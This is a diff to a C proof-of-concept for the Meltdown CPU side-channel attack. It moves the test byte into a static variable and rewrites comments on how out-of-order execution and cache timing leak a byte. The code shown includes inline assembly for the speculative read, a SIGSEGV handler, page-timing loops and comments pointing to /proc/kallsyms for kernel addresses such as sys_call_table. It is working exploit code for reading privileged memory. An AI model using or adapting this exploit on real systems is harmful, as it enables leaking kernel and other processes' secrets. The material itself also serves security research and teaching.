@@ -11,6 +11,7 @@
 #define CACHE_READ_THRESHOLD_TICKS (100)
 
 
+static char local_byte_to_guess = 0xBB;
 static jmp_buf jbuf;
 
 static void sigsegv_handler(int signo)
@@ -20,7 +21,7 @@ static void sigsegv_handler(int signo)
 
 int main()
 {
-    void* address_to_guess_byte = 0;
+    void *address_to_guess_byte = 0;
     //address_to_guess_byte = (void*) 0xffffffff986001e0; // uncomment to test with global address
 
     // I do tests on sys_call_table. Your current sys_call_table address can be found: sudo cat /proc/kallsyms | grep sys_call_table
@@ -28,9 +29,7 @@ int main()
     // You can find your sys_read address: sudo cat /proc/kallsyms | grep sys_read
 
     if (address_to_guess_byte == 0) { // testing with local address
-        char *local_byte = malloc(1);
-        *local_byte = 0xAA;
-        address_to_guess_byte = local_byte;
+        address_to_guess_byte = &local_byte_to_guess;
     }
 
     char *meltdown_buf = malloc(PAGE_SIZE * 256);
@@ -53,7 +52,8 @@ int main()
             // But don't worry. It most likely will be executed because of out-of-order execution optimizations in Intel CPUs :-)
 
             // Instructions that Intel CPUs likes to execute out-of-order
-            // Once executed they cause cache heat side effect that can be detected while SIGSEGV handling
+            // Once executed (out-of-order) they cause the pages of meltdown_buf with index equal to byte value to be loaded into CPU cache
+            // This side effect then can be detected while SIGSEGV handling to find this page index and byte value
             asm __volatile__ (
                 "%=:                                  \n"
                 "xorq %%rax, %%rax                    \n"
@@ -70,7 +70,7 @@ int main()
             static unsigned long ticks[256];
             static volatile char junk;
 
-            // measure access ticks to each page in the buffer
+            // Measure access ticks to each page in the buffer
             for (int i = 0; i < 256; i++) {
                 _mm_mfence();
                 _mm_lfence();
@@ -83,7 +83,7 @@ int main()
 
             for (int i = 0; i < 256; i++) {
                 if (ticks[i] < CACHE_READ_THRESHOLD_TICKS) { // reading cached page takes less CPU ticks then reading not cached one
-                    // if the page is in the cache then the corresponding page shift is most likely the byte value we are guessing
+                    // if the page is in the cache then the corresponding page index is most likely the byte value we are guessing
                     printf("guessed byte: 0x%X\n", i);
                 }
             }
